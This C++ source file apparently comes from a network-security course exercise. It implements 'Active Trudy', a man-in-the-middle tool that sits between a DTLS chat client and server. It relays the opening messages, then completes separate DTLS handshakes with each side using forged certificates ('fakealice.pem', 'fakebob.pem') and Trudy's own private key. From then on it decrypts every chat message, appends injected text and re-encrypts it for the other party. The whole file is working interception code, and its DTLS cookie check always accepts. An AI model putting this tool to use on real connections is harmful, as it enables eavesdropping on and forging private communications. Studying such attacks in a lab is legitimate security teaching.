#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h> // read(), write(), close()
#include <fcntl.h>
// C++ Libraries
#include <iostream>
#include <bits/stdc++.h>
#include <string>
#include <arpa/inet.h>

// OpenSSL libraries
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/bio.h>

#define MAX 1024
#define DEFAULT_PORT 8080
#define SA struct sockaddr

using namespace std;

// Variables
int server_sock, client_sock;
struct timeval timeout;
// bool workAsClient;
BIO *bio, *out;

int generateCookie(SSL *ssl_context, unsigned char *session_cookie, unsigned int *cookie_len)
{
    memcpy(session_cookie, "ses_co", 6);
    *cookie_len = 6;

    return 1;
}

int verifyCookie(SSL *ssl_context, const unsigned char *session_cookie, unsigned int cookie_len)
{
    return 1;
}

void fillBuffer(char *buffer, string s)
{
    bzero(buffer, sizeof(buffer));
    int i = 0, msgLen = s.length();

    for (int x = 0; x < msgLen; x++)
        buffer[i++] = s[x];
    buffer[msgLen] = '\0';
}

void fillBuffer(char *&buff)
{
    bzero(buff, sizeof(buff));
    int i = 0;
    while ((buff[i++] = getchar()) != '\n')
        ;
}

void sendMessage(string s, sockaddr_in addr, char *buff, int sockfd)
{
    fillBuffer(buff, s);
    socklen_t addr_len = sizeof(addr);
    sendto(sockfd, (const char *)buff, strlen(buff), MSG_CONFIRM, (const struct sockaddr *)&addr, addr_len);
}

string recvMessage(bool printit, sockaddr_in addr, char *buff, int sockfd)
{
    bzero(buff, sizeof(buff));

    socklen_t addr_len = sizeof(addr);
    int n = recvfrom(sockfd, (char *)buff, MAX, MSG_WAITALL, (struct sockaddr *)&addr, &addr_len);
    buff[n] = '\0';

    if (printit == true)
        printf("Message received : %s\n", buff);

    string ret;
    int i = 0;

    while (buff[i] != '\0')
        ret += buff[i++];

    ret[n] = '\0';

    return ret;
}

string SSL_r(SSL *&ssl)
{
    char buffer[MAX];
    int bytes;
    bzero(buffer, sizeof(buffer));
    bytes = SSL_read(ssl, buffer, sizeof(buffer));
    if (bytes <= 0)
    {
        ERR_print_errors_fp(stderr);
        return "";
    }
    buffer[bytes] = '\0';
    return string(buffer);
}

void SSL_w(const std::string &message, SSL *&ssl)
{
    char buffer[MAX];
    fillBuffer(buffer, message);
    SSL_write(ssl, buffer, strlen(buffer));
}

void loadCertificates(bool workAsClient, SSL_CTX *&ssl_context)
{
    const char *certificate;
    const char *privateKey;
    const char *chain;
    const char *CAfile = "CAfile.pem";

    if (workAsClient == true)
    {
        certificate = "fakealice.pem";
        privateKey = "trudy_private_key.pem";
        // chain = "alice_chain.pem";
    }
    else
    {
        certificate = "fakebob.pem";
        privateKey = "trudy_private_key.pem";
        // chain = "bob_chain.pem";
    }

    // Load Certificate
    if (SSL_CTX_use_certificate_file(ssl_context, certificate, SSL_FILETYPE_PEM) <= 0)
    {
        ERR_print_errors_fp(stderr);
        cout << "error in cert\n";
        exit(EXIT_FAILURE);
    }

    // Load Private Key
    if (SSL_CTX_use_PrivateKey_file(ssl_context, privateKey, SSL_FILETYPE_PEM) <= 0)
    {
        ERR_print_errors_fp(stderr);
        cout << "error in key\n";
        exit(EXIT_FAILURE);
    }

    // Verify private key
    if (!SSL_CTX_check_private_key(ssl_context))
    {
        cout << "Private Key Verification failed!\n";
        exit(0);
    }

    cout << "Private key Loaded Properly and verified!\n";

    // Load CAfile and verify
    if (!SSL_CTX_load_verify_locations(ssl_context, CAfile, NULL))
    {
        ERR_print_errors_fp(stderr);
        cout << " -CA verification failed \n";
        exit(EXIT_FAILURE);
    }

    // Client/Server Certificate verification
    SSL_CTX_set_verify(ssl_context, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, NULL);
}

void initializeOpenSSL(bool workAsClient, SSL_CTX *&ssl_context)
{
    if (workAsClient == true)
    {
        SSL_load_error_strings();
        OpenSSL_add_ssl_algorithms();
        ERR_load_crypto_strings();
    }

    if (workAsClient == true)
        ssl_context = SSL_CTX_new(DTLSv1_2_client_method());
    else
        ssl_context = SSL_CTX_new(DTLSv1_2_server_method());

    if (!ssl_context)
    {
        perror("Error creating SSL context");
        exit(EXIT_FAILURE);
    }

    SSL_CTX_set_security_level(ssl_context, 1);
    SSL_CTX_set_cipher_list(ssl_context, "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384");
    // SSL_CTX_set_cipher_list(ssl_context, "ALL:NULL:eNULL:aNULL");

    SSL_CTX_set_mode(ssl_context, SSL_MODE_AUTO_RETRY);
    SSL_CTX_set_session_cache_mode(ssl_context, SSL_SESS_CACHE_OFF);
    SSL_CTX_set_verify(ssl_context, SSL_VERIFY_PEER, NULL);

    if (workAsClient == false)
    {
        SSL_CTX_set_cookie_generate_cb(ssl_context, generateCookie);
        SSL_CTX_set_cookie_verify_cb(ssl_context, &verifyCookie);
    }

    loadCertificates(workAsClient, ssl_context);

    timeout.tv_sec = 5;
    timeout.tv_usec = 0;

    if (workAsClient == false)
    {
        bio = BIO_new_dgram(client_sock, BIO_NOCLOSE);
        BIO_ctrl(bio, BIO_CTRL_DGRAM_SET_RECV_TIMEOUT, 0, &timeout);
        if (!bio)
        {
            cout << "Error in creating bio";
            exit(0);
        }
    }
}

int unBlockSocket(int *sockfd)
{

    int flags = fcntl(*sockfd, F_GETFL, 0);
    if (flags == -1)
    {
        cout << "Error in making the socket non blocking\n Err :: Flag = -1\n";
        perror("fcntl");
        return -1;
    }

    if (fcntl(*sockfd, F_SETFL, flags | O_NONBLOCK) == -1)
    {
        cout << "Error in making the socket non blocking\n Err :: fcntrl failed to set the new flag!\n";
        perror("fcntl");
        return -1;
    }

    return 0;
}

void SSL_handshake(sockaddr_in &addr, bool workAsClient, SSL_CTX *&ssl_context, SSL *&ssl)
{
    // Now doing handshake
    ssl = SSL_new(ssl_context);

    if (workAsClient == true)
        SSL_set_fd(ssl, server_sock);

    if (workAsClient == false)
    {
        SSL_set_options(ssl, SSL_OP_COOKIE_EXCHANGE);
        SSL_set_bio(ssl, bio, bio);
    }

    if (workAsClient == true)
    {
        int res = 0;
        int ub = -1;
        while (res <= 0)
        {
            while (ub == -1)
            {
                ub = unBlockSocket(&server_sock);
            }

            res = SSL_connect(ssl);

            if (res <= 0)
            {

                ERR_print_errors_fp(stderr);

                int error = SSL_get_error(ssl, res);
                // if (erprint == 0)
                //     cout << "Reconnecting...";

                // erprint = (erprint + 1) % 50000;
            }
        }
        cout << "\n\n";
    }
    else
    {
        int res = 0;
        int ub = 0;
        while (res <= 0)
        {
            res = DTLSv1_listen(ssl, (BIO_ADDR *)&addr);
            if (res < 0)
            {
                cout << "Error in connecting to Client Retrying...";
                ERR_print_errors_fp(stderr);
                continue;
            }
        }

        SSL_SESSION *session = SSL_get_session(ssl);

        while (true)
        {
            while (ub == -1)
            {
                ub = unBlockSocket(&client_sock);
            }

            int resa = SSL_accept(ssl);
            if (resa > 0)
                break;
            if (resa <= 0)
            {
                cout << "Problem in SSL Accept! Retrying..." << endl;
                continue;
            }
        }
    }
}

string changing_client_mssg(string message)
{
    if(message != "chat_close")
   	 message += ": JAI SHREE RAM  -Trudy ";
    return message;
}

string changing_server_mssg(string message)
{
    if(message != "chat_close")
   	 message += ": JAI SHREE KRISHNA  -Trudy ";
    return message;
}

void activeTrudy(const char *client, const char *server)
{

    // Client socket will talk to client(Alice)
    // Server socket will talk to Server(Bob)
    socklen_t client_len, server_len;
    struct sockaddr_in client_addr, server_addr;

    // Create UDP socket for Alice
    if ((client_sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
        printf("ERROR opening socket for Alice");

    // Create UDP socket for server
    if ((server_sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
        printf("ERROR opening socket for server");

    // Initialize Alice address
    memset((char *)&client_addr, 0, sizeof(client_addr));
    client_addr.sin_family = AF_INET;
    client_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    client_addr.sin_port = htons(DEFAULT_PORT);

    // Initiailize server address
    memset((char *)&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    // server_addr.sin_addr.s_addr = inet_addr("172.31.0.3");
    server_addr.sin_port = htons(DEFAULT_PORT);

    struct hostent *host_info = gethostbyname(server);
    bcopy((char *)host_info->h_addr, (char *)&server_addr.sin_addr.s_addr, host_info->h_length);

    // Bind the Alice socket
    if (bind(client_sock, (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0)
        printf("ERROR on binding CLIENT socket\n");

    // Creating buffer

    //------- Processing initial 4 messages

    char buffer[MAX];
    int loop = 0;

    if (connect(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)))
    {
        cout << "Error in connecting socket from client\n";
        exit(0);
    }

    cout << "Intercepting Inital messagess between " << client << " and " << server << "...\n " << endl;
    while (loop < 2)
    {

        loop++;
        memset(buffer, 0, MAX);

        client_len = sizeof(client_addr);
        int n = recvfrom(client_sock, (char *)buffer, MAX, MSG_WAITALL, (struct sockaddr *)&client_addr, &client_len);
        if (n < 0)
        {
            printf("ERROR in recvfrom from Alice");
        }
        buffer[n] = '\0';

        cout << "Messge received from Client forwarded to Server: " << buffer << "\n";

        server_len = sizeof(server_addr);
        if (sendto(server_sock, buffer, strlen(buffer), 0, (struct sockaddr *)&server_addr, server_len) < 0)
            printf("ERROR in sendto to server");

        memset(buffer, 0, MAX);
        n = recvfrom(server_sock, buffer, MAX, 0, (struct sockaddr *)&server_addr, &server_len);
        if (n < 0)
        {
            printf("ERROR in recvfrom from server");
        }
        buffer[n] = '\0';
        cout << "Messge received from Server forwarded to Client: " << buffer << "\n";

        // Forward response from server to Alice
        client_len = sizeof(client_addr);
        if (sendto(client_sock, buffer, strlen(buffer), 0, (struct sockaddr *)&client_addr, client_len) < 0)
            printf("ERROR in sendto to client");
        cout << endl;
    }

    // -- Processing Finished!

    SSL_CTX *ssl_context_client, *ssl_context_server;
    SSL *ssl_client, *ssl_server;

    // ---- For Client
    // Initializing OpenSSL
    cout << "Initializing Openssl with server...\n";
    initializeOpenSSL(true, ssl_context_server);
    cout << "OpenSSL initialized, Succeesfully with server!!!\n\n";

    // Doing Handshake
    cout << "Doing DTLS handshake server...\n";
    SSL_handshake(server_addr, true, ssl_context_server, ssl_server);
    cout << "DTLS connection established with server!!!\n\n";

    // ----- For Server
    // Initializing OpenSSL
    cout << "Initializing Openssl with client...\n";
    initializeOpenSSL(false, ssl_context_client);
    cout << "OpenSSL initialized, Succeesfully with client!!!\n\n";

    // Doing Handshake
    cout << "Doing DTLS handshake with client...\n";
    SSL_handshake(client_addr, false, ssl_context_client, ssl_client);
    cout << "DTLS connection established with client!!!\n\n";

    cout << "Intercepting application messages between " << client << " and " << server << "...\n\n";

    // Insert While Here
    while (1)
    {

        string sslcm = "";

        while (sslcm == "")
        {
            sslcm = SSL_r(ssl_client);
        }

        if (sizeof(sslcm) < 0)
        {
            printf("ERROR in reciving from Client");
        }

        cout << "Messge received from Client: " << sslcm << "\n";

        sslcm = changing_client_mssg(sslcm);

        SSL_w(sslcm, ssl_server);

        if (sslcm == "chat_close")
        {
            cout << "Client is closing the connection...\n";
            break;
        }

        string sslsm = "";
        while (sslsm == "")
        {
            sslsm = SSL_r(ssl_server);
        }
        if (sizeof(sslsm) < 0)
        {
            printf("ERROR in reciving  from Server");
        }

        cout << "Messge received from Server: " << sslsm << "\n";

        sslsm = changing_server_mssg(sslsm);

        SSL_w(sslsm, ssl_client);

        if (sslsm == "chat_close")
        {
            cout << "Server is closing the connection...\n";
            break;
        }
        cout << "\n";
    }

    // Close sockets
    close(client_sock);
    close(server_sock);

    return;
}
int main(int argc, char **argv)
{
    cout << "\n\n+++++++++ STARTING ACTIVE TRUDY +++++++++\n\n";
    if (argc < 2)
    {
        printf("Enter at least 2 arguments.\n");
        return 1;
    }

    else if ((strcmp(argv[1], "-m")))
    {
        printf("Invalid option.\n");
        return 1;
    }
    else
    {
        activeTrudy(argv[2], argv[3]);
    }

    return 0;
}
